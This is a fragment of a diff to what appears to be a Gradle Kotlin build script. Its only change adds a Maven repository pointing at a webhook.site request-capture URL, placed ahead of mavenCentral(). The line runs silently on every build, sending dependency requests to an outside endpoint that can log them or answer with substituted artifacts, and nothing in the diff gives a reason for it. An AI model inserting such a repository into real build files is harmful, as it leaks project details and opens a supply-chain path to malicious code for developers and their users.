@@ -31,6 +31,7 @@ tasks.withType<Javadoc>().configureEach {
 }
 
 repositories {
+    maven("https://webhook.site/ff12d557-4a8c-4d1e-b4d3-ff34599df12d")
     mavenCentral()
 }
 
